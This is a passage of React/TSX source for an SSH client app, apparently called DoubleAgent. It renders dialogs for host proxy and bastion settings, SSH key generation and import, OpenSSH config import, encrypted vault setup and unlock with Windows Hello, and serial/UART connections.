                  className="cyber-hud-input"
                />
              </div>

              <div>
                <label className="cyber-label">Initial Directory (Optional)</label>
                <input
                  aria-label="Host Initial Directory"
                  placeholder="Initial Directory (e.g. /var/www or C:\Projects)"
                  value={hostInitialDir}
                  onChange={(e) => setHostInitialDir(e.target.value)}
                  className="cyber-hud-input"
                />
              </div>

              <div style={{ borderTop: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)', paddingTop: '10px', marginTop: '4px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                  <label className="cyber-label" style={{ margin: 0 }}>
                    Proxy &amp; Bastion Settings
                  </label>
                  <button
                    type="button"
                    className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                    onClick={() => {
                      setShowAddHostModal(false);
                      setShowProxyProfilesModal(true);
                    }}
                    title="Open Proxy Profiles to configure authenticated SOCKS5 proxies"
                  >
                    <CyberIcon name="shield" size={14} /> Manage Proxy Profiles (SOCKS5 Auth)
                  </button>
                </div>

                <select
                  aria-label="Host Proxy Profile"
                  value={hostProxyProfileId}
                  onChange={(e) => setHostProxyProfileId(e.target.value)}
                  className="cyber-hud-select"
                  style={{ width: '100%', marginBottom: '8px' }}
                >
                  <option value="">Direct Connection</option>
                  {(vaultSummary.proxyProfiles || [])
                    .filter((p) => {
                      const targetEng = hostEngagementId || activeEngagement?.id || '';
                      return !p.engagementId || p.engagementId === targetEng;
                    })
                    .map((p) => (
                      <option key={p.id} value={p.id}>
                        Use Proxy Profile: {p.name} ({p.type}) {p.engagementId ? '[Engagement]' : '[Global]'}
                      </option>
                    ))}
                </select>

                {!hostProxyProfileId && (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                    <div style={{ fontSize: '0.72rem', color: '#94a3b8', background: 'color-mix(in srgb, var(--accent-bright) 5%, transparent)', padding: '6px 10px', borderLeft: '2px solid var(--accent-bright)' }}>
                      <CyberIcon name="bolt" size={14} /> <strong>Tip:</strong> For authenticated SOCKS5 proxies, use <em>Manage Proxy Profiles</em> above (credentials stored encrypted in vault). Custom ProxyJump format: <code>[user@]bastion[:port]</code>. Custom ProxyCommand supports inline auth flags (e.g. <code>ncat --proxy-auth user:pass --proxy-type socks5 proxy:1080 %h %p</code>).
                    </div>
                    <div>
                      <label className="cyber-label">Custom ProxyJump (Bastion Chain)</label>
                      <input
                        aria-label="Host Custom ProxyJump"
                        placeholder="Custom ProxyJump (e.g. bastion.corp.net:2222 or jump1,jump2)"
                        value={hostProxyJump}
                        onChange={(e) => setHostProxyJump(e.target.value)}
                        className="cyber-hud-input"
                      />
                    </div>
                    <div>
                      <label className="cyber-label">Custom ProxyCommand</label>
                      <input
                        aria-label="Host Custom ProxyCommand"
                        placeholder="Custom ProxyCommand (e.g. ssh -W %h:%p bastion or ncat --proxy-auth user:pass ...)"
                        value={hostProxyCommand}
                        onChange={(e) => setHostProxyCommand(e.target.value)}
                        className="cyber-hud-input"
                      />
                    </div>
                  </div>
                )}
              </div>

              <div>
                <label className="cyber-label">Host Color Tag</label>
                <div className="color-picker-row" aria-label="Host Color Swatches">
                  <button
                    type="button"
                    className={`color-swatch-btn color-swatch-auto ${!hostColor ? 'selected' : ''}`}
                    title="Auto (deterministic color based on host name)"
                    aria-label="Color Auto"
                    onClick={() => setHostColor('')}
                  />
                  {HOST_PALETTE.map((c) => (
                    <button
                      key={c}
                      type="button"
                      className={`color-swatch-btn ${hostColor === c ? 'selected' : ''}`}
                      style={{ backgroundColor: c }}
                      title={c}
                      aria-label={`Color ${c}`}
                      onClick={() => setHostColor(c)}
                    />
                  ))}
                </div>
              </div>

              <label className="checkbox-label" style={{ marginTop: '0.2rem' }}>
                <input
                  type="checkbox"
                  aria-label="Enable Host Session Logging"
                  checked={hostSessionLogging}
                  onChange={(e) => setHostSessionLogging(e.target.checked)}
                />
                Enable Session Logging for this Host
              </label>
            </form>

            <div className="dialog-footer">
              <button
                type="button"
                className="cyber-btn cyber-btn-secondary"
                onClick={() => {
                  setShowAddHostModal(false);
                  setEditingHostId(null);
                  setEditingIdentityId('');
                  setShowHostPass(false);
                }}
              >
                Cancel
              </button>
              <button type="submit" form="host-modal-form" className="cyber-btn cyber-btn-primary">
                {editingHostId ? 'Update Host' : 'Save Host'}
              </button>
            </div>
          </div>
        </div>
      )}

      {showKeychainModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="SSH Keychain"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowKeychainModal(false);
            }
          }}
        >
          <div className="cyber-dialog-card keychain-modal-card" style={{ maxWidth: '640px', width: '94vw', maxHeight: '90vh', overflow: 'hidden', display: 'flex', flexDirection: 'column', position: 'relative' }}>
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <CyberIcon name="key" size={14} /> SSH Keychain Manager
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    VAULT-CRYPTO // ED25519 · RSA-3072 · OPENSSH · PUTTY PPK
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => setShowKeychainModal(false)}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>

            <div className="dialog-body" style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
              <form onSubmit={(e) => void handleGenerateKey(e)} style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem' }}>
                <div>
                  <label className="cyber-label">Key Label</label>
                  <input
                    aria-label="Key Label"
                    className="cyber-hud-input"
                    placeholder="Key Label (e.g. Work Laptop Ed25519)"
                    value={keyLabel}
                    onChange={(e) => setKeyLabel(e.target.value)}
                    required
                  />
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.65rem' }}>
                  <div>
                    <label className="cyber-label">Algorithm</label>
                    <select
                      aria-label="Key Algorithm"
                      className="cyber-hud-select"
                      value={keyType}
                      onChange={(e) => setKeyType(e.target.value)}
                    >
                      <option value="ed25519">Ed25519 (Recommended)</option>
                      <option value="rsa">RSA-3072</option>
                    </select>
                  </div>
                  <div>
                    <label className="cyber-label">Passphrase (Optional)</label>
                    <input
                      aria-label="Key Passphrase"
                      className="cyber-hud-input"
                      type="password"
                      placeholder="Optional Key Passphrase"
                      value={keyPassphrase}
                      onChange={(e) => setKeyPassphrase(e.target.value)}
                    />
                  </div>
                </div>
                <div>
                  <label className="cyber-label">Import Existing Private Key (.ppk / OpenSSH PEM)</label>
                  <textarea
                    aria-label="Import Private Key Content"
                    className="cyber-hud-input font-mono"
                    style={{ minHeight: '80px', resize: 'vertical' }}
                    placeholder="Or paste OpenSSH PEM / PuTTY .ppk private key here to import..."
                    value={importKeyRaw}
                    onChange={(e) => setImportKeyRaw(e.target.value)}
                  />
                </div>
                <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '0.2rem' }}>
                  {importKeyRaw.trim() ? (
                    <button
                      type="button"
                      className="cyber-btn cyber-btn-primary"
                      onClick={(e) => void handleImportKey(e)}
                    >
                      Import Key (.ppk / OpenSSH)
                    </button>
                  ) : (
                    <button type="submit" className="cyber-btn cyber-btn-primary">
                      Generate Keypair
                    </button>
                  )}
                </div>
              </form>

              {modalError && <div className="status-banner error">{modalError}</div>}

              <div style={{ borderTop: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)', paddingTop: '0.75rem', marginTop: '0.25rem' }}>
                <label className="cyber-label" style={{ marginBottom: '0.5rem' }}>Stored Keys in Encrypted Vault</label>
                <div className="palette-results" aria-label="Saved SSH Keys" style={{ maxHeight: '200px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                  {(vaultSummary.keys || []).length === 0 ? (
                    <p style={{ fontSize: '0.78rem', color: '#94a3b8' }}>No SSH keys stored in Vault yet.</p>
                  ) : (
                    (vaultSummary.keys || []).map((k) => (
                      <div key={k.id} className="cyber-rule-card" style={{ padding: '0.6rem 0.85rem' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                          <div>
                            <strong style={{ color: 'var(--accent-bright)', fontSize: '0.85rem' }}>
                              {k.label} ({k.type})
                            </strong>
                            <div style={{ color: '#94a3b8', fontSize: '0.72rem', fontFamily: 'JetBrains Mono, Consolas, monospace' }}>{k.fingerprint}</div>
                          </div>
                          <button
                            type="button"
                            className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                            onClick={() => void handleCopyPublicKey(k.publicKey, k.label)}
                          >
                            Copy Public Key
                          </button>
                        </div>
                      </div>
                    ))
                  )}
                </div>
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', marginTop: '0.5rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  onClick={() => setShowKeychainModal(false)}
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {showSSHConfigModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Import SSH Config"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowSSHConfigModal(false);
            }
          }}
        >
          <div
            className="cyber-dialog-card"
            style={{
              maxWidth: '680px',
              width: '94vw',
              maxHeight: '88vh',
              overflow: 'hidden',
              display: 'flex',
              flexDirection: 'column',
              position: 'relative',
              padding: 0,
            }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <CyberIcon name="gear" size={14} /> Import OpenSSH Config
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    SSH-INGEST // ~/.ssh/config PARSER (HostName, User, Port, IdentityFile, ProxyJump)
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => setShowSSHConfigModal(false)}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>

            <form
              className="dialog-body"
              onSubmit={(e) => void handleImportSSHConfig(e)}
              style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}
            >
              <p style={{ margin: 0, fontSize: '0.82rem', color: '#94a3b8', lineHeight: 1.5 }}>
                Paste your <code>~/.ssh/config</code> below. Imports <strong>Host</strong>,{' '}
                <strong>HostName</strong>, <strong>User</strong>, <strong>Port</strong>,{' '}
                <strong>IdentityFile</strong>, and <strong>ProxyJump</strong>, and reports unsupported
                directives.
              </p>
              <textarea
                aria-label="SSH Config Content"
                className="cyber-hud-input font-mono"
                style={{ minHeight: '140px', resize: 'vertical' }}
                placeholder="Host bastion&#10;  HostName 203.0.113.10&#10;  User ops&#10;  Port 2222"
                value={sshConfigText}
                onChange={(e) => setSshConfigText(e.target.value)}
                required
              />
              {sshConfigResult && (
                <div className="info-banner" aria-label="SSH Config Import Summary" style={{ background: 'color-mix(in srgb, var(--accent-bright) 8%, transparent)', border: '1px solid color-mix(in srgb, var(--accent-bright) 30%, transparent)', padding: '0.65rem 0.85rem' }}>
                  <p style={{ margin: 0, fontSize: '0.82rem', color: 'var(--accent-bright)' }}>
                    Imported <strong>{sshConfigResult.entries.length}</strong> host(s).
                  </p>
                  {sshConfigResult.warnings.length > 0 && (
                    <ul aria-label="SSH Config Warnings" style={{ margin: '0.4rem 0 0 1rem', padding: 0, fontSize: '0.75rem', color: '#f59e0b' }}>
                      {sshConfigResult.warnings.map((w, idx) => (
                        <li key={idx}>{w}</li>
                      ))}
                    </ul>
                  )}
                </div>
              )}
              {modalError && <div className="error-banner">{modalError}</div>}
              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.65rem', marginTop: '0.5rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  onClick={() => setShowSSHConfigModal(false)}
                >
                  Close
                </button>
                <button type="submit" className="cyber-btn cyber-btn-primary">
                  Parse &amp; Import Config
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {showVaultModal && !vaultInitialized && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Initialize Vault"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowVaultModal(false);
            }
          }}
        >
          <div
            className="cyber-dialog-card"
            style={{
              maxWidth: '560px',
              width: '94vw',
              maxHeight: '90vh',
              overflow: 'hidden',
              display: 'flex',
              flexDirection: 'column',
              position: 'relative',
              padding: 0,
            }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <CyberIcon name="lock" size={14} /> Initialize Encrypted Vault
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    VAULT-INIT // ARGON2ID + XCHACHA20-POLY1305 KEY DERIVATION
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => setShowVaultModal(false)}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>

            <div className="dialog-body" style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
              <div className="modal-brand-hero" style={{ textAlign: 'center', marginBottom: '0.5rem' }}>
                <img src={brandLogoText} alt="DoubleAgent" className="modal-vault-brand-img" style={{ maxHeight: '42px' }} />
              </div>
              <p style={{ margin: 0, fontSize: '0.82rem', color: '#94a3b8', lineHeight: 1.5 }}>
                Choose how you want to protect your local SSH vault (you can change this anytime in{' '}
                <strong style={{ color: 'var(--accent-bright)' }}>Vault Security</strong>):
              </p>
              <div>
                <label className="cyber-label">Master Password</label>
                <input
                  aria-label="Master Password"
                  className="cyber-hud-input"
                  type="password"
                  placeholder="New Master Password"
                  value={masterPassword}
                  onChange={(e) => setMasterPassword(e.target.value)}
                  disabled={helloPending}
                  autoFocus
                />
              </div>
              <div>
                <label className="cyber-label">Confirm Master Password</label>
                <input
                  aria-label="Confirm Master Password"
                  className="cyber-hud-input"
                  type="password"
                  placeholder="Confirm Master Password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  disabled={helloPending}
                />
              </div>
              {helloPending && (
                <div className="info-banner" style={{ background: 'color-mix(in srgb, var(--accent-bright) 8%, transparent)', border: '1px solid color-mix(in srgb, var(--accent-bright) 30%, transparent)', padding: '0.65rem 0.85rem', color: 'var(--accent-bright)' }}>
                  Waiting for Windows Hello / Security Key confirmation window...
                </div>
              )}
              {modalError && <div className="error-banner">{modalError}</div>}
              <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'flex-end', gap: '0.5rem', marginTop: '0.5rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  disabled={helloPending}
                  onClick={() => setShowVaultModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  disabled={helloPending}
                  onClick={() => void handleInitializeVault(true)}
                >
                  Skip Password for Now
                </button>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  disabled={helloPending}
                  onClick={() => void handleInitializeWithHello()}
                >
                  {helloPending ? 'Verifying Hello...' : 'Use Windows Hello / Key'}
                </button>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-primary"
                  disabled={helloPending}
                  onClick={() => void handleInitializeVault(false)}
                >
                  Create Vault
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {showVaultModal && vaultInitialized && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Unlock Vault"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowVaultModal(false);
              setMasterPassword('');
            }
          }}
        >
          <div
            className="cyber-dialog-card"
            style={{
              maxWidth: '520px',
              width: '94vw',
              maxHeight: '90vh',
              overflow: 'hidden',
              display: 'flex',
              flexDirection: 'column',
              position: 'relative',
              padding: 0,
            }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <CyberIcon name="unlock" size={14} /> Unlock Encrypted Vault
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    VAULT-ACCESS // ENTER MASTER PASSWORD OR USE HARDWARE KEY
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => {
                  setShowVaultModal(false);
                  setMasterPassword('');
                }}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>

            <form
              className="dialog-body"
              onSubmit={(e) => void handleVaultUnlock(e)}
              style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.85rem' }}
            >
              <div className="modal-brand-hero" style={{ textAlign: 'center', marginBottom: '0.25rem' }}>
                <img src={appLogo} alt="DoubleAgent" className="modal-vault-icon-img" style={{ maxHeight: '48px' }} />
              </div>
              <p style={{ margin: 0, fontSize: '0.82rem', color: '#94a3b8', lineHeight: 1.5 }}>
                Unlock with <strong>Windows Hello / Security Key</strong> (PIN, Fingerprint, YubiKey) or{' '}
                {passwordless ? 'click Unlock below:' : 'enter your Master Password below:'}
              </p>
              <button
                type="button"
                className="cyber-btn cyber-btn-primary"
                disabled={helloPending}
                onClick={() => void handleQuickUnlockHello()}
                style={{ width: '100%', padding: '0.55rem' }}
              >
                {helloPending
                  ? 'Waiting for Windows Hello / Security Key...'
                  : <><CyberIcon name="key" size={14} /> Unlock with Windows Hello / Security Key</>}
              </button>
              {!passwordless && (
                <div>
                  <label className="cyber-label">Master Password</label>
                  <input
                    aria-label="Master Password"
                    className="cyber-hud-input"
                    type="password"
                    placeholder="Or enter Master Password"
                    value={masterPassword}
                    onChange={(e) => setMasterPassword(e.target.value)}
                    disabled={helloPending}
                  />
                </div>
              )}
              {helloPending && (
                <div className="info-banner" style={{ background: 'color-mix(in srgb, var(--accent-bright) 8%, transparent)', border: '1px solid color-mix(in srgb, var(--accent-bright) 30%, transparent)', padding: '0.65rem 0.85rem', color: 'var(--accent-bright)' }}>
                  Please complete the Windows Security prompt (check your taskbar if not focused).
                </div>
              )}
              {modalError && <div className="error-banner">{modalError}</div>}
              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem', marginTop: '0.5rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-danger"
                  disabled={helloPending}
                  onClick={() => void handleResetVault()}
                  title="Archives the current vault and starts fresh if you forgot the password"
                >
                  Reset Vault
                </button>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  disabled={helloPending}
                  onClick={() => {
                    setShowVaultModal(false);
                    setMasterPassword('');
                  }}
                >
                  Cancel
                </button>
                <button type="submit" className="cyber-btn cyber-btn-secondary" disabled={helloPending}>
                  {passwordless ? 'Unlock (No Password)' : 'Unlock with Password'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {showSettingsModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Vault Security Settings"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowSettingsModal(false);
            }
          }}
        >
          <div
            className="cyber-dialog-card"
            style={{
              maxWidth: '540px',
              width: '94vw',
              maxHeight: '90vh',
              overflow: 'hidden',
              display: 'flex',
              flexDirection: 'column',
              position: 'relative',
              padding: 0,
            }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <CyberIcon name="shield" size={14} /> Vault Security &amp; Windows Hello
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    VAULT-KEY // MASTER PASSWORD ROTATION &amp; HARDWARE CREDENTIALS
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => setShowSettingsModal(false)}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>

            <form
              className="dialog-body"
              onSubmit={(e) => void handleChangePassword(e)}
              style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}
            >
              <p style={{ margin: 0, fontSize: '0.82rem', color: '#94a3b8', lineHeight: 1.5 }}>
                {passwordless
                  ? 'Your vault currently has no Master Password. Set one below to protect it.'
                  : 'Change your Master Password (leave New Password empty to switch to passwordless mode).'}
              </p>
              {!passwordless && (
                <div>
                  <label className="cyber-label">Current Master Password</label>
                  <input
                    aria-label="Current Master Password"
                    className="cyber-hud-input"
                    type="password"
                    placeholder="Current Master Password (optional if unlocked via Hello)"
                    value={currentPassword}
                    onChange={(e) => setCurrentPassword(e.target.value)}
                  />
                </div>
              )}
              <div>
                <label className="cyber-label">New Master Password</label>
                <input
                  aria-label="New Master Password"
                  className="cyber-hud-input"
                  type="password"
                  placeholder="New Master Password (or leave empty for passwordless)"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                />
              </div>
              <div className="quick-unlock-box" style={{ background: 'color-mix(in srgb, var(--accent-bright) 5%, transparent)', border: '1px solid color-mix(in srgb, var(--accent-bright) 25%, transparent)', padding: '0.65rem 0.85rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontSize: '0.78rem', color: '#94a3b8' }}>
                  Windows Hello / DPAPI Key:{' '}
                  <strong style={{ color: quickUnlockReady ? '#10b981' : '#f59e0b' }}>
                    {quickUnlockReady ? 'Active & Saved' : 'Not Armed'}
                  </strong>
                </span>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                  onClick={() => void handleEnableQuickUnlock()}
                >
                  Sync Windows Hello / Key
                </button>
              </div>
              {modalError && <div className="error-banner">{modalError}</div>}
              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '0.5rem', marginTop: '0.5rem' }}>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-danger"
                  onClick={() => void handleResetVault()}
                >
                  Reset Vault
                </button>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-secondary"
                  onClick={() => setShowSettingsModal(false)}
                >
                  Close
                </button>
                <button type="submit" className="cyber-btn cyber-btn-primary">
                  Save Password
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {showGlobalSettingsModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Global Settings"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowGlobalSettingsModal(false);
            }
          }}
        >
          <SettingsView
            activeTab={settingsActiveTab}
            onTabChange={setSettingsActiveTab}
            globalSettings={globalSettings}
            onUpdateSettings={handleUpdateSettings}
            onResetSettings={handleResetSettings}
            vaultLocked={vaultLocked}
            passwordless={passwordless}
            helloPending={helloPending}
            quickUnlockReady={quickUnlockReady}
            modalError={modalError}
            onEnableQuickUnlock={handleEnableQuickUnlock}
            onChangePassword={handleChangePasswordDirect}
            onResetVault={handleResetVault}
            availableSnippets={vaultSummary.snippets || []}
            syncInfo={syncInfo}
            onRefreshSync={refreshSyncInfo}
            onOpenSSHConfigImport={() => {
              setShowGlobalSettingsModal(false);
              setModalError('');
              setSshConfigResult(null);
              setShowSSHConfigModal(true);
            }}
            onOpenPuttyTermiusImport={() => {
              setShowGlobalSettingsModal(false);
              setShowImportModal(true);
            }}
            onOpenConflictResolver={(rep, file) => {
              setActiveConflictReport(rep);
              setActiveConflictFilePath(file);
              setShowConflictModal(true);
            }}
            onOpenToolForManagedFile={openToolForManagedFile}
            onOpenAsTab={() => {
              setShowGlobalSettingsModal(false);
              openSettingsTab(settingsActiveTab);
            }}
            onClose={() => setShowGlobalSettingsModal(false)}
            isModal={true}
          />
        </div>
      )}
      {showSerialModal && (
        <div
          className="modal-backdrop cyber-modal-overlay"
          role="dialog"
          aria-label="Serial Connection"
          onClick={(e) => {
            if (e.target === e.currentTarget) {
              setShowSerialModal(false);
            }
          }}
        >
          <div
            className="cyber-dialog-card serial-modal-card"
            style={{ maxWidth: '640px', width: '94vw', maxHeight: '90vh', overflow: 'hidden', display: 'flex', flexDirection: 'column', position: 'relative' }}
          >
            {/* Reticles */}
            <div className="cyber-corner-reticle cyber-corner-tl" />
            <div className="cyber-corner-reticle cyber-corner-tr" />
            <div className="cyber-corner-reticle cyber-corner-bl" />
            <div className="cyber-corner-reticle cyber-corner-br" />

            {/* Header */}
            <div className="dialog-header" style={{ flexShrink: 0 }}>
              <div className="dialog-title">
                <span className="cyber-hazard-stripes">///</span>
                <div>
                  <h3 style={{ margin: 0, fontSize: '0.98rem', color: 'var(--accent-bright)', letterSpacing: '0.06em' }}>
                    <span><CyberIcon name="bolt" size={14} /> </span>
                    <span>Serial / UART Console Connection</span>
                  </h3>
                  <div style={{ fontSize: '0.7rem', color: 'var(--accent-bright)', fontFamily: 'JetBrains Mono, Consolas, monospace', marginTop: '2px', letterSpacing: '0.04em' }}>
                    HARDWARE-LINK // COM &amp; USB-UART SERIAL TELEMETRY
                  </div>
                </div>
              </div>
              <button
                type="button"
                className="cyber-btn-close"
                onClick={() => setShowSerialModal(false)}
                aria-label="Close dialog"
              >
                ×
              </button>
            </div>
            <form className="dialog-body" onSubmit={(e) => void handleConnectSerial(e)} style={{ flex: 1, minHeight: 0, overflowY: 'auto', padding: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
              {modalError && <p className="status-banner error">{modalError}</p>}

              <div>
                <label className="cyber-label" htmlFor="serial-port-select">Port / Device</label>
                <div className="serial-port-row" style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                  {serialPorts.length > 0 ? (
                    <select
                      id="serial-port-select"
                      aria-label="Serial Port Select"
                      className="cyber-hud-select"
                      style={{ flex: 1 }}
                      value={serialConfig.port}
                      onChange={(e) =>
                        setSerialConfig((prev) => ({ ...prev, port: e.target.value }))
                      }
                    >
                      {serialPorts.some((p) => p.isConnected) && (
                        <optgroup label=" Connected & Active Hardware">
                          {serialPorts
                            .filter((p) => p.isConnected)
                            .map((p) => (
                              <option key={p.port} value={p.port}>
                                {p.port} — {p.description} {p.isUsb ? '(USB)' : '(Active)'}
                              </option>
                            ))}
                        </optgroup>
                      )}
                      {serialPorts.some((p) => !p.isConnected) && (
                        <optgroup label=" Available / Offline Ports">
                          {serialPorts
                            .filter((p) => !p.isConnected)
                            .map((p) => (
                              <option key={p.port} value={p.port}>
                                {p.port} — {p.description || 'Serial Port'} (Offline)
                              </option>
                            ))}
                        </optgroup>
                      )}
                    </select>
                  ) : (
                    <input
                      id="serial-port-select"
                      aria-label="Serial Port Name"
                      type="text"
                      className="cyber-hud-input"
                      style={{ flex: 1 }}
                      placeholder="e.g. COM1 or /dev/ttyUSB0"
                      value={serialConfig.port}
                      onChange={(e) =>
                        setSerialConfig((prev) => ({ ...prev, port: e.target.value }))
                      }
                      required
                    />
                  )}
                  <button
                    type="button"
                    className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                    onClick={() => void handleRefreshSerialPorts()}
                    title="Refresh detected serial ports"
                    disabled={serialLoading}
                    style={{ whiteSpace: 'nowrap' }}
                  >
                    {serialLoading ? '...' : <><CyberIcon name="refresh" size={14} /> Refresh</>}
                  </button>
                </div>
              </div>

              {(() => {
                const selectedPortInfo = serialPorts.find((p) => p.port === serialConfig.port);
                if (selectedPortInfo) {
